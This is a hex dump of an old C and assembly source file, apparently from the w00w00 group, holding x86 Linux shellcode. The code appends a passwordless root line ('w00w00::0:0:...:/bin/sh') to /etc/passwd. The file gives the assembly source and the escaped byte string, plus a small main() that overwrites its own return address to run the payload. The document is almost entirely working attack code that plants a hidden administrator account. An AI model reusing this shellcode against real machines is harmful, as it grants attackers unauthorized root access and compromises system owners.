00000000  2f 2a 0d 0a 0d 0a 20 20  6a 6d 70 20 63 61 6c 6c  |/*....  jmp call|
00000010  5f 77 30 30 77 30 30 0d  0a 0d 0a 77 30 30 77 30  |_w00w00....w00w0|
00000020  30 3a 0d 0a 20 20 70 6f  70 6c 20 25 65 64 69 0d  |0:..  popl %edi.|
00000030  0a 20 20 6a 6d 70 20 77  30 77 30 77 0d 0a 0d 0a  |.  jmp w0w0w....|
00000040  63 61 6c 6c 5f 77 30 30  77 30 30 3a 0d 0a 0d 0a  |call_w00w00:....|
00000050  20 20 63 61 6c 6c 20 77  30 30 77 30 30 0d 0a 0d  |  call w00w00...|
00000060  0a 77 30 77 30 77 3a 0d  0a 0d 0a 20 23 20 4f 50  |.w0w0w:.... # OP|
00000070  45 4e 0d 0a 20 23 20 65  63 78 3d 66 6c 61 67 20  |EN.. # ecx=flag |
00000080  28 4f 5f 52 44 4f 4e 4c  59 2c 20 4f 5f 57 52 4f  |(O_RDONLY, O_WRO|
00000090  4e 4c 59 2c 20 2e 2e 2e  29 20 0d 0a 20 23 20 20  |NLY, ...) .. #  |
000000a0  20 20 20 4f 5f 57 52 4f  4e 4c 59 20 7c 20 4f 5f  |   O_WRONLY | O_|
000000b0  41 50 50 45 4e 44 20 7c  20 4f 5f 43 52 45 41 54  |APPEND | O_CREAT|
000000c0  20 3d 20 30 78 34 34 31  0d 0a 20 23 20 65 64 78  | = 0x441.. # edx|
000000d0  3d 66 69 6c 65 20 6d 6f  64 65 0d 0a 20 23 20 65  |=file mode.. # e|
000000e0  62 78 3d 61 64 64 72 65  73 73 20 6f 66 20 66 69  |bx=address of fi|
000000f0  6c 65 6e 61 6d 65 0d 0a  20 23 20 65 61 78 3d 30  |lename.. # eax=0|
00000100  78 30 35 20 73 79 73 63  61 6c 6c 20 6e 75 6d 62  |x05 syscall numb|
00000110  65 72 0d 0a 0d 0a 20 20  78 6f 72 6c 20 25 65 62  |er....  xorl %eb|
00000120  78 2c 25 65 62 78 0d 0a  20 20 6d 6f 76 62 20 24  |x,%ebx..  movb $|
00000130  28 66 69 6c 65 2d 77 30  77 30 77 29 2c 25 62 6c  |(file-w0w0w),%bl|
00000140  0d 0a 20 20 61 64 64 6c  20 25 65 64 69 2c 25 65  |..  addl %edi,%e|
00000150  62 78 0d 0a 0d 0a 20 20  78 6f 72 62 20 25 61 6c  |bx....  xorb %al|
00000160  2c 25 61 6c 0d 0a 20 20  6d 6f 76 62 20 25 61 6c  |,%al..  movb %al|
00000170  2c 31 31 28 25 65 62 78  29 0d 0a 0d 0a 20 20 78  |,11(%ebx)....  x|
00000180  6f 72 6c 20 25 65 63 78  2c 25 65 63 78 0d 0a 20  |orl %ecx,%ecx.. |
00000190  20 6d 6f 76 77 20 24 30  78 34 34 31 2c 25 63 78  | movw $0x441,%cx|
000001a0  0d 0a 0d 0a 20 20 78 6f  72 6c 20 25 65 64 78 2c  |....  xorl %edx,|
000001b0  25 65 64 78 0d 0a 20 20  6d 6f 76 77 20 24 30 30  |%edx..  movw $00|
000001c0  36 34 34 2c 25 64 78 0d  0a 0d 0a 20 20 78 6f 72  |644,%dx....  xor|
000001d0  6c 20 25 65 61 78 2c 25  65 61 78 0d 0a 20 20 6d  |l %eax,%eax..  m|
000001e0  6f 76 62 20 24 30 78 35  2c 25 61 6c 0d 0a 0d 0a  |ovb $0x5,%al....|
000001f0  20 20 69 6e 74 20 24 30  78 38 30 0d 0a 20 20 6d  |  int $0x80..  m|
00000200  6f 76 6c 20 25 65 61 78  2c 25 65 62 78 20 20 20  |ovl %eax,%ebx   |
00000210  20 23 20 73 61 76 65 20  66 69 6c 65 20 64 65 73  | # save file des|
00000220  63 72 69 70 74 6f 72 20  74 6f 20 25 65 62 78 20  |criptor to %ebx |
00000230  28 66 6f 72 20 77 72 69  74 65 29 0d 0a 20 0d 0a  |(for write).. ..|
00000240  23 20 20 57 52 49 54 45  0d 0a 23 20 20 65 63 78  |#  WRITE..#  ecx|
00000250  3d 61 64 64 72 65 73 73  20 6f 66 20 62 75 66 66  |=address of buff|
00000260  65 72 20 74 6f 20 77 72  69 74 65 0d 0a 23 20 20  |er to write..#  |
00000270  65 64 78 3d 6e 75 6d 62  65 72 20 6f 66 20 62 79  |edx=number of by|
00000280  74 65 73 20 74 6f 20 77  72 69 74 65 0d 0a 23 20  |tes to write..# |
00000290  20 65 62 78 3d 66 69 6c  65 20 64 65 73 63 72 69  | ebx=file descri|
000002a0  70 74 6f 72 0d 0a 23 20  20 65 61 78 3d 30 78 30  |ptor..#  eax=0x0|
000002b0  34 0d 0a 20 20 0d 0a 20  20 78 6f 72 6c 20 25 65  |4..  ..  xorl %e|
000002c0  63 78 2c 25 65 63 78 0d  0a 20 20 6d 6f 76 62 20  |cx,%ecx..  movb |
000002d0  24 28 73 74 72 69 6e 67  2d 77 30 77 30 77 29 2c  |$(string-w0w0w),|
000002e0  25 63 6c 0d 0a 20 20 61  64 64 6c 20 25 65 64 69  |%cl..  addl %edi|
000002f0  2c 25 65 63 78 0d 0a 0d  0a 20 20 78 6f 72 6c 20  |,%ecx....  xorl |
00000300  25 65 64 78 2c 25 65 64  78 0d 0a 20 20 6d 6f 76  |%edx,%edx..  mov|
00000310  62 20 24 33 31 2c 25 64  6c 0d 0a 0d 0a 20 20 78  |b $31,%dl....  x|
00000320  6f 72 6c 20 25 65 61 78  2c 25 65 61 78 0d 0a 20  |orl %eax,%eax.. |
00000330  20 6d 6f 76 62 20 24 30  78 30 34 2c 25 61 6c 0d  | movb $0x04,%al.|
00000340  0a 0d 0a 20 20 69 6e 74  20 24 30 78 38 30 20 20  |...  int $0x80  |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000370  20 20 20 20 20 20 20 20  20 0d 0a 20 20 0d 0a 20  |         ..  .. |
00000380  20 78 6f 72 6c 20 25 65  61 78 2c 25 65 61 78 0d  | xorl %eax,%eax.|
00000390  0a 20 20 6d 6f 76 62 20  24 31 2c 25 61 6c 0d 0a  |.  movb $1,%al..|
000003a0  20 20 69 6e 74 20 24 30  78 38 30 0d 0a 20 20 0d  |  int $0x80..  .|
000003b0  0a 66 69 6c 65 3a 20 20  0d 0a 2e 61 73 63 69 69  |.file:  ...ascii|
000003c0  20 22 2f 65 74 63 2f 70  61 73 73 77 64 22 0d 0a  | "/etc/passwd"..|
000003d0  65 6e 64 66 69 6c 65 3a  0d 0a 2e 62 79 74 65 20  |endfile:...byte |
000003e0  31 20 0d 0a 73 74 72 69  6e 67 3a 0d 0a 2e 61 73  |1 ..string:...as|
000003f0  63 69 69 20 22 77 30 30  77 30 30 3a 3a 30 3a 30  |cii "w00w00::0:0|
00000400  3a 77 30 77 30 77 21 3a  2f 3a 2f 62 69 6e 2f 73  |:w0w0w!:/:/bin/s|
00000410  68 5c 6e 22 0d 0a 0d 0a  2a 2f 0d 0a 0d 0a 2f 2a  |h\n"....*/..../*|
00000420  20 0d 0a 20 2a 20 53 6f  75 72 63 65 20 74 6f 20  | .. * Source to |
00000430  74 68 69 73 20 69 73 20  70 61 73 73 2e 73 0d 0a  |this is pass.s..|
00000440  20 2a 20 54 68 69 73 20  77 69 6c 6c 20 61 70 70  | * This will app|
00000450  65 6e 64 20 61 20 72 6f  6f 74 20 6c 69 6e 65 20  |end a root line |
00000460  74 6f 20 74 68 65 20 70  61 73 73 77 64 20 66 69  |to the passwd fi|
00000470  6c 65 20 28 73 65 65 20  74 68 65 20 73 6f 75 72  |le (see the sour|
00000480  63 65 29 2e 0d 0a 20 2a  0d 0a 20 2a 20 53 68 6f  |ce)... *.. * Sho|
00000490  6b 20 28 4d 61 74 74 20  43 6f 6e 6f 76 65 72 29  |k (Matt Conover)|
000004a0  2c 20 73 68 6f 6b 40 64  61 74 61 66 6f 72 63 65  |, shok@dataforce|
000004b0  2e 6e 65 74 0d 0a 20 2a  2f 0d 0a 0d 0a 63 68 61  |.net.. */....cha|
000004c0  72 20 73 68 65 6c 6c 63  6f 64 65 5b 5d 3d 0d 0a  |r shellcode[]=..|
000004d0  20 20 22 5c 78 65 62 5c  78 30 33 5c 78 35 66 5c  |  "\xeb\x03\x5f\|
000004e0  78 65 62 5c 78 30 35 5c  78 65 38 5c 78 66 38 5c  |xeb\x05\xe8\xf8\|
000004f0  78 66 66 5c 78 66 66 5c  78 66 66 5c 78 33 31 5c  |xff\xff\xff\x31\|
00000500  78 64 62 5c 78 62 33 5c  78 33 35 5c 78 30 31 5c  |xdb\xb3\x35\x01\|
00000510  78 66 62 22 0d 0a 20 20  22 5c 78 33 30 5c 78 63  |xfb"..  "\x30\xc|
00000520  30 5c 78 38 38 5c 78 34  33 5c 78 30 62 5c 78 33  |0\x88\x43\x0b\x3|
00000530  31 5c 78 63 39 5c 78 36  36 5c 78 62 39 5c 78 34  |1\xc9\x66\xb9\x4|
00000540  31 5c 78 30 34 5c 78 33  31 5c 78 64 32 5c 78 36  |1\x04\x31\xd2\x6|
00000550  36 5c 78 62 61 5c 78 61  34 22 0d 0a 20 20 22 5c  |6\xba\xa4"..  "\|
00000560  78 30 31 5c 78 33 31 5c  78 63 30 5c 78 62 30 5c  |x01\x31\xc0\xb0\|
00000570  78 30 35 5c 78 63 64 5c  78 38 30 5c 78 38 39 5c  |x05\xcd\x80\x89\|
00000580  78 63 33 5c 78 33 31 5c  78 63 39 5c 78 62 31 5c  |xc3\x31\xc9\xb1\|
00000590  78 34 31 5c 78 30 31 5c  78 66 39 5c 78 33 31 22  |x41\x01\xf9\x31"|
000005a0  0d 0a 20 20 22 5c 78 64  32 5c 78 62 32 5c 78 31  |..  "\xd2\xb2\x1|
000005b0  66 5c 78 33 31 5c 78 63  30 5c 78 62 30 5c 78 30  |f\x31\xc0\xb0\x0|
000005c0  34 5c 78 63 64 5c 78 38  30 5c 78 33 31 5c 78 63  |4\xcd\x80\x31\xc|
000005d0  30 5c 78 62 30 5c 78 30  31 5c 78 63 64 5c 78 38  |0\xb0\x01\xcd\x8|
000005e0  30 5c 78 32 66 22 0d 0a  20 20 22 5c 78 36 35 5c  |0\x2f"..  "\x65\|
000005f0  78 37 34 5c 78 36 33 5c  78 32 66 5c 78 37 30 5c  |x74\x63\x2f\x70\|
00000600  78 36 31 5c 78 37 33 5c  78 37 33 5c 78 37 37 5c  |x61\x73\x73\x77\|
00000610  78 36 34 5c 78 30 31 5c  78 37 37 5c 78 33 30 5c  |x64\x01\x77\x30\|
00000620  78 33 30 5c 78 37 37 5c  78 33 30 22 0d 0a 20 20  |x30\x77\x30"..  |
00000630  22 5c 78 33 30 5c 78 33  61 5c 78 33 61 5c 78 33  |"\x30\x3a\x3a\x3|
00000640  30 5c 78 33 61 5c 78 33  30 5c 78 33 61 5c 78 37  |0\x3a\x30\x3a\x7|
00000650  37 5c 78 33 30 5c 78 37  37 5c 78 33 30 5c 78 37  |7\x30\x77\x30\x7|
00000660  37 5c 78 32 31 5c 78 33  61 5c 78 32 66 5c 78 33  |7\x21\x3a\x2f\x3|
00000670  61 22 0d 0a 20 20 22 5c  78 32 66 5c 78 36 32 5c  |a"..  "\x2f\x62\|
00000680  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 37 33 5c  |x69\x6e\x2f\x73\|
00000690  78 36 38 5c 78 30 61 22  3b 0d 0a 0d 0a 76 6f 69  |x68\x0a";....voi|
000006a0  64 20 6d 61 69 6e 28 29  0d 0a 7b 0d 0a 0d 0a 20  |d main()..{.... |
000006b0  20 69 6e 74 20 2a 72 65  74 3b 0d 0a 20 20 0d 0a  | int *ret;..  ..|
000006c0  20 20 70 72 69 6e 74 66  28 22 77 30 30 77 30 30  |  printf("w00w00|
000006d0  21 5c 6e 22 29 3b 0d 0a  20 20 72 65 74 20 3d 20  |!\n");..  ret = |
000006e0  28 69 6e 74 20 2a 29 26  72 65 74 20 2b 20 32 3b  |(int *)&ret + 2;|
000006f0  0d 0a 20 20 28 2a 72 65  74 29 20 3d 20 28 69 6e  |..  (*ret) = (in|
00000700  74 29 73 68 65 6c 6c 63  6f 64 65 3b 0d 0a 7d     |t)shellcode;..}|
0000070f
